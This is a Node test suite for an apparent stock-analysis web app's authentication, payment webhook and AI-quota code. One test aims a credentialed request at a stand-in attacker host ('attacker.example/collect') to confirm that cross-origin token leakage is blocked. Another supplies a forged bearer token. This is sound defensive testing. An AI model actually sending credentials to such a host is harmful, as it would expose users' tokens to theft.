import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { fetchWithAccessToken, getBearerToken } from "../lib/auth-utils.ts";
import {
  getAuthErrorMessage,
  validateLoginInput,
  validateSignupInput,
} from "../lib/auth-errors.ts";
import { getLimit } from "../lib/entitlements.ts";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");

test("Supabase public config is resolved lazily by the shared client", async () => {
  const originalUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const originalAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
  delete process.env.NEXT_PUBLIC_SUPABASE_URL;
  delete process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

  try {
    const { getSupabasePublicConfig } = await import("../lib/supabase-config.ts?no-runtime-config");
    assert.throws(getSupabasePublicConfig, /Supabase public credentials are missing/);
    const supabase = readFileSync(resolve(root, "lib/supabase.ts"), "utf8");
    assert.match(supabase, /export function getSupabaseClient\(\)/);
    assert.match(supabase, /client = createClient\(/);
    assert.doesNotMatch(supabase, /(?:const|let)\s+supabase\s*=\s*createClient\(/);
  } finally {
    if (originalUrl === undefined) delete process.env.NEXT_PUBLIC_SUPABASE_URL;
    else process.env.NEXT_PUBLIC_SUPABASE_URL = originalUrl;
    if (originalAnonKey === undefined) delete process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
    else process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY = originalAnonKey;
  }
});

test("bearer parsing rejects absent, malformed, and empty credentials", () => {
  assert.equal(getBearerToken(null), null);
  assert.equal(getBearerToken(""), null);
  assert.equal(getBearerToken("Basic token"), null);
  assert.equal(getBearerToken("Bearer   "), null);
  assert.equal(getBearerToken("bEaReR valid-token"), "valid-token");
});

test("authenticated fetch forwards the current token and preserves request headers", async () => {
  let captured;
  const fetcher = async (_input, init) => {
    captured = init;
    return new Response(null, { status: 204 });
  };

  await fetchWithAccessToken(
    "/api/private",
    { headers: { "Content-Type": "application/json", Authorization: "Bearer stale-token" } },
    "current-token",
    fetcher,
    "https://analystos.example/dashboard",
  );

  assert.equal(captured.headers.get("authorization"), "Bearer current-token");
  assert.equal(captured.headers.get("content-type"), "application/json");
});

test("authenticated fetch removes caller-supplied credentials when no session exists", async () => {
  let captured;
  const fetcher = async (_input, init) => {
    captured = init;
    return new Response(null, { status: 204 });
  };

  await fetchWithAccessToken(
    "/api/private",
    { headers: { Authorization: "Bearer forged-token" } },
    undefined,
    fetcher,
    "https://analystos.example/",
  );

  assert.equal(captured.headers.has("authorization"), false);
});

test("authenticated fetch never sends credentials to a different origin", async () => {
  let fetched = false;
  const fetcher = async () => {
    fetched = true;
    return new Response(null);
  };

  await assert.rejects(
    fetchWithAccessToken(
      "https://attacker.example/collect",
      {},
      "current-token",
      fetcher,
      "https://analystos.example/",
    ),
    /current origin/,
  );
  assert.equal(fetched, false);
});

test("signup and login validation require valid credentials", () => {
  assert.equal(validateSignupInput("", "person@example.com", "long-enough"), "All fields are required.");
  assert.equal(validateSignupInput("Analyst", "not-an-email", "long-enough"), "Enter a valid email address.");
  assert.equal(validateSignupInput("Analyst", "person@example.com", "short"), "Password must be at least 8 characters.");
  assert.equal(validateSignupInput("Analyst", " person@example.com ", "long-enough"), null);
  assert.equal(validateLoginInput("", "secret"), "Email and password are required.");
  assert.equal(validateLoginInput("person@example.com", "secret"), null);
});

test("auth provider errors produce actionable, non-secret messages", () => {
  assert.match(getAuthErrorMessage({ code: "invalid_credentials" }, "login"), /incorrect/);
  assert.match(getAuthErrorMessage({ code: "email_not_confirmed" }, "login"), /Confirm your email/);
  assert.match(getAuthErrorMessage({ code: "user_already_exists" }, "signup"), /already exists/);
  assert.match(getAuthErrorMessage({ code: "over_email_send_rate_limit" }, "signup"), /Too many/);
  assert.match(getAuthErrorMessage(new TypeError("Failed to fetch"), "login"), /connection/);
  assert.match(
    getAuthErrorMessage(new Error("Checkout was closed before payment confirmation."), "signup"),
    /Checkout was closed/,
  );
});

test("AI question limits match the database quota behavior", () => {
  assert.equal(getLimit("free", "ai_questions"), 5);
  assert.equal(getLimit("pro", "ai_questions"), 100);
  assert.equal(getLimit("analyst", "ai_questions"), 500);
});

test("signup and login require a real Supabase session before redirecting", () => {
  const signup = readFileSync(resolve(root, "app/signup/page.tsx"), "utf8");
  const login = readFileSync(resolve(root, "app/login/page.tsx"), "utf8");
  assert.match(signup, /supabase\.auth\.signUp/);
  assert.match(signup, /if \(!data\.session\)/);
  assert.match(signup, /emailRedirectTo:/);
  assert.doesNotMatch(signup, /\.from\(["']profiles["']\)\s*\.upsert/);
  assert.match(login, /supabase\.auth\.signInWithPassword/);
  assert.match(login, /if \(!data\.session\?\.user\)/);
});

test("all protected API routes reject requests without a verified user", () => {
  const routes = [
    "app/api/ai/route.ts",
    "app/api/stocks/ai/route.ts",
    "app/api/feed/generate/route.ts",
    "app/api/payments/route.ts",
    "app/api/payments/subscriptions/verify/route.ts",
    "app/api/payments/subscriptions/manage/route.ts",
  ];

  for (const path of routes) {
    const source = readFileSync(resolve(root, path), "utf8");
    assert.match(source, /getAuthenticatedUser\(req\)/, `${path} must verify the bearer token`);
    assert.match(
      source,
      /if\s*\(!authUser\)\s*(?:\{\s*)?return errorResponse\("Unauthorized", 401\)/,
      `${path} must reject an unauthenticated request`,
    );
  }
});

test("feed and payment writes derive ownership from the verified session", () => {
  const feedRoute = readFileSync(resolve(root, "app/api/feed/generate/route.ts"), "utf8");
  const paymentRoute = readFileSync(resolve(root, "app/api/payments/route.ts"), "utf8");
  assert.match(feedRoute, /const userId = authUser\.id/);
  assert.doesNotMatch(feedRoute, /body\.userId/);
  assert.match(paymentRoute, /notes:\s*\{\s*userId:\s*authUser\.id,[\s\S]*product/);
  assert.doesNotMatch(paymentRoute, /body\.userId/);
});

test("paid plan activation depends on a verified payment webhook", () => {
  const signup = readFileSync(resolve(root, "app/signup/page.tsx"), "utf8");
  const webhook = readFileSync(resolve(root, "app/api/payments/webhook/route.ts"), "utf8");
  const webhookSecurity = readFileSync(resolve(root, "lib/razorpay-payments.ts"), "utf8");
  assert.match(signup, /fetchWithAuth\(["']\/api\/payments["']/);
  assert.match(webhook, /verifyRazorpaySignature/);
  assert.match(webhookSecurity, /timingSafeEqual/);
  assert.match(webhook, /SUPABASE_SERVICE_ROLE_KEY/);
  assert.match(webhook, /RAZORPAY_WEBHOOK_SECRET/);
  assert.doesNotMatch(webhook, /webhookSecret\s*===\s*["']/);
  assert.doesNotMatch(webhook, /NEXT_PUBLIC_SUPABASE_ANON_KEY/);
});

test("the retired profile migration cannot recreate duplicate entitlement state", () => {
  const migration = readFileSync(resolve(root, "supabase/migrations/20261010_auth_profile_security.sql"), "utf8");
  assert.match(migration, /RETIRED/);
  assert.doesNotMatch(migration, /^\s*CREATE\s+(?:TABLE|OR REPLACE FUNCTION)/im);
});

test("waitlist failures are explicit and cannot produce simulated success", () => {
  const route = readFileSync(resolve(root, "app/api/waitlist/route.ts"), "utf8");
  const page = readFileSync(resolve(root, "app/page.tsx"), "utf8");
  assert.match(route, /SUPABASE_SERVICE_ROLE_KEY/);
  assert.doesNotMatch(route, /simulat|fallbackPosition|Math\.random/i);
  assert.match(route, /status:\s*503/);
  assert.match(page, /if \(!res\.ok\) \{\s*setWaitlistError\(errorMessage\);\s*return;/);
  assert.match(page, /catch \{\s*setWaitlistError\(/);
  assert.doesNotMatch(page, /waitlistPosition \|\| 248/);
});

test("subscription checks use the server-derived effective entitlement", () => {
  const auth = readFileSync(resolve(root, "lib/auth.ts"), "utf8");
  const navbar = readFileSync(resolve(root, "components/navbar.tsx"), "utf8");
  assert.match(auth, /\.rpc\(\s*'get_effective_user_plan'/);
  assert.doesNotMatch(auth, /\.from\('profiles'\)/);
  assert.match(navbar, /\.rpc\(\s*"get_effective_user_plan"/);
  assert.match(navbar, /user_metadata\?\.full_name/);
});

test("the AI quota RPC remains atomic and enforces plan-specific daily limits", () => {
  const migration = readFileSync(
    resolve(root, "supabase/migrations/20261104_razorpay_payment_idempotency.sql"),
    "utf8",
  );
  assert.match(migration, /FOR UPDATE/);
  assert.match(migration, /WHEN 'pro' THEN 100/);
  assert.match(migration, /WHEN 'analyst' THEN 500/);
  assert.match(migration, /ELSE 5/);
  assert.match(migration, /used_today >= daily_limit/);
  assert.match(migration, /questions_used = au\.questions_used \+ 1/);
  assert.match(migration, /CREATE TABLE public\.ai_usage/);
  assert.match(migration, /subscription_function_acl_cleanup/);
  assert.match(migration, /Unexpected direct EXECUTE grant remains/);
  assert.match(migration, /has_any_column_privilege\('service_role', usage_oid, 'REFERENCES'\)/);
});
